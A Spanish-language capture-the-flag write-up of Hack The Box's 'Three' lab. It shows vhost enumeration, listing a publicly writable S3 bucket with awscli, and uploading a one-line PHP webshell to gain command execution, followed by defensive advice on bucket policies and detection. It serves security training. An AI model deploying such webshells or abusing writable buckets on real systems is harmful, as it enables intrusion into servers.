---
title: Three (HTB Starting Point)
date: 2026-06-15
tags: [ciberseguridad, htb, starting-point, pentesting, cloud, aws, s3, rce, vhosts, webshell, linux]
type: nota
status: en-progreso
source: claude-code
aliases: [HTB Three, three htb, s3 misconfiguration htb]
---

# Three — HTB Starting Point (Tier 1)

**Tier 1 · SO: Linux · Dificultad: Very Easy · Skills: awscli, Virtual Hosts (vhosts), S3 bucket misconfiguration, RCE via webshell**

> Este laboratorio pertenece a Hack The Box Starting Point, un entorno de pentesting legal y expresamente autorizado. Nunca apliques estas tecnicas fuera de entornos controlados con permiso explicito.

Three ilustra uno de los fallos mas frecuentes en arquitecturas cloud: un bucket S3 con permisos de escritura publica que ademas sirve la web de produccion. El resultado es ejecucion remota de codigo sin necesidad de explotar ninguna CVE.

---

## Objetivo

Obtener la flag alojada en el servidor Linux accediendo mediante RCE conseguido a traves de un bucket S3 mal configurado.

---

## Acceso a la maquina (paso previo)

Antes de atacar nada necesitas conectarte a la red de HTB y arrancar la maquina para obtener su **IP**:

1. **Descarga tu VPN** desde el panel de HTB (Starting Point -> *Connect* -> descarga el `.ovpn`).
2. **Conectate a la VPN** y dejala corriendo en una terminal aparte:
   ```bash
   sudo openvpn starting_point_<tu_usuario>.ovpn
   ```
3. **Lanza la maquina** en la web (boton *Spawn Machine*). HTB te dara una **IP** (tipo `10.129.x.x`).
4. Comprueba que llegas a ella:
   ```bash
   ping -c2 <IP>
   ```
5. En el resto de este writeup, **sustituye `<IP>` por la IP que te toque** (es dinamica: cambia cada vez que lanzas la maquina).

> Alternativa sin VPN: el **Pwnbox** (Kali en el navegador que ofrece HTB) ya viene conectado a la red; solo lanzas la maquina y usas su IP directamente.

## Reconocimiento

**Categoria: escaneo de puertos y fingerprinting de servicios**

```bash
nmap -sC -sV -oN nmap_three.txt <IP>
```

Lo que revela tipicamente:
- **Puerto 22/tcp** — OpenSSH (acceso SSH, no explotable directamente sin credenciales)
- **Puerto 80/tcp** — servidor HTTP (Apache o similar sirviendo un sitio web)

Con esto sabemos que el vector principal es la web en el puerto 80.

---

## Enumeracion

### 1. Virtual host y dominio

**Categoria: enumeracion de vhosts / DNS interno**

Al visitar `http://<IP>` se muestra el sitio de *The Toppers*. En la pagina (footer, seccion contacto o cabecera de correo) aparece una direccion de email con dominio `thetoppers.htb`.

Anadir el dominio al resolver local para que el navegador y las herramientas lo resuelvan contra la IP del laboratorio:

```bash
echo "<IP>  thetoppers.htb" | sudo tee -a /etc/hosts
```

### 2. Enumeracion de subdominios

**Categoria: fuzzing de virtual hosts**

Con el dominio base conocido, se enumeran subdominios con `gobuster` (modo vhost) u otra herramienta similar:

```bash
gobuster vhost \
  -u http://thetoppers.htb \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  --append-domain
```

Se descubre: **`s3.thetoppers.htb`**

Anadir tambien este subdominio a `/etc/hosts`:

```bash
echo "<IP>  s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### 3. Interaccion con el bucket S3

**Categoria: AWS S3 API — bucket publico sin autenticacion real**

El endpoint simula la API de AWS S3. Con `awscli` se puede interactuar aunque las credenciales sean ficticias (el servicio no las valida porque el bucket es publico/mal configurado):

```bash
aws configure
# AWS Access Key ID:     anything
# AWS Secret Access Key: anything
# Default region:        us-east-1
# Default output format: json
```

Listar el contenido del bucket:

```bash
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

Se listar los archivos que componen la web (`.php`, `index.php`, imagenes, etc.), confirmando que **el bucket S3 sirve directamente los archivos de la aplicacion web**.

---

## Acceso inicial (foothold)

**Categoria: File Upload → RCE via webshell PHP**

Dado que el bucket es escribible y sus archivos se sirven como la web, subir una webshell PHP equivale a tener ejecucion de codigo en el servidor.

**Paso 1 — Crear la webshell:**

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

**Paso 2 — Subir la webshell al bucket:**

```bash
aws s3 cp shell.php s3://thetoppers.htb/ --endpoint-url http://s3.thetoppers.htb
```

**Paso 3 — Verificar que se subio:**

```bash
aws s3 ls s3://thetoppers.htb --endpoint-url http://s3.thetoppers.htb
```

**Paso 4 — Ejecutar comandos via la webshell:**

```bash
curl "http://thetoppers.htb/shell.php?cmd=id"
# Respuesta esperada: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Paso 5 — Localizar y leer la flag:**

```bash
curl "http://thetoppers.htb/shell.php?cmd=find+/+%2Fname+flag.txt+2>/dev/null"
curl "http://thetoppers.htb/shell.php?cmd=cat+/var/www/html/flag.txt"
```

La ruta exacta puede variar; ajustar el `find` en la maquina en vivo.

---

## Escalada de privilegios

No requiere privesc: la flag se obtiene directamente con el acceso via webshell como `www-data`. El diseno del nivel es demostrar el patron S3-misconfiguration → RCE, no la escalada.

---

## Flags

| Flag | Ubicacion tipica | Notas |
|---|---|---|
| Unica flag | `/var/www/html/flag.txt` o raiz del proyecto web | Confirmar con `find` si la ruta difiere |

```
<flag>
```

> La flag real la asigna HTB al lanzar la maquina; nunca se comparte publica mente.

---

## Patron y teoria

**Este es el nucleo del nivel. El patron se repite en entornos reales.**

### El patron: S3 Writable Bucket + Web Hosting = RCE trivial

```
Atacante
  └─► lista bucket (awscli, no auth)
        └─► sube shell.php
              └─► visita http://sitio/shell.php
                    └─► RCE como www-data
```

Tres condiciones que deben coincidir (y en este nivel coinciden todas):

1. **Bucket S3 sin restriccion de escritura** — cualquiera puede hacer `s3:PutObject`.
2. **El bucket sirve directamente la web** — los archivos del bucket se interpretan como PHP en el servidor web.
3. **El servidor interpreta PHP** — no basta con subir el archivo; tiene que ejecutarse.

Si falta cualquiera de las tres, el ataque no funciona. Esto es clave para disenar la defensa.

### Como se defiende / como se disena bien (perspectiva dev/purple team)

**Separacion de responsabilidades (storage vs. hosting):**
- El bucket S3 debe almacenar *assets estaticos* (imagenes, CSS, JS). Nunca codigo ejecutable del servidor.
- El codigo PHP/Python/Node debe vivir en el servidor o en un pipeline de CI/CD con control de versiones, no en un bucket publico.

**Permisos de bucket minimos:**
- Politica de bucket con `"Effect": "Deny"` para `s3:PutObject` desde IPs no autorizadas.
- Activar **Block Public Access** a nivel de cuenta y de bucket.
- Usar **S3 Object Ownership** para evitar que un upload externo tome ownership.

**No servir uploads como ejecutables:**
- Si el bucket almacena uploads de usuarios, configurar el servidor web para servir esa carpeta con `php_admin_flag engine Off` (Apache) o equivalente en Nginx — los archivos se descargan, no se ejecutan.
- Alternativamente: servir uploads directamente desde S3 con URL prefirmadas, nunca a traves del interprete PHP.

**Deteccion:**
- Alertas en CloudTrail / logs de S3 sobre `PutObject` desde IPs inesperadas.
- WAF rule que bloquee peticiones a archivos `.php` recien subidos.
- Escaneo periodico del bucket con herramientas como `truffleHog` o `s3scanner` para detectar exposicion publica.

**Lectura de ejemplo de una politica S3 restrictiva:**

```json
{
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:PutObject",
  "Resource": "arn:aws:s3:::thetoppers.htb/*",
  "Condition": {
    "NotIpAddress": {
      "aws:SourceIp": ["10.0.0.0/8"]
    }
  }
}
```

### Analogia para desarrolladores

Un bucket S3 escribible que sirve la web es equivalente a tener un `FTP` anonimo con acceso de escritura a `/var/www/html/`. La diferencia es que S3 parece "cloud y moderno", lo que baja la guardia.

---

## Conexiones

- [[HTB_Starting_Point/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[09-devsecops-y-appsec]]
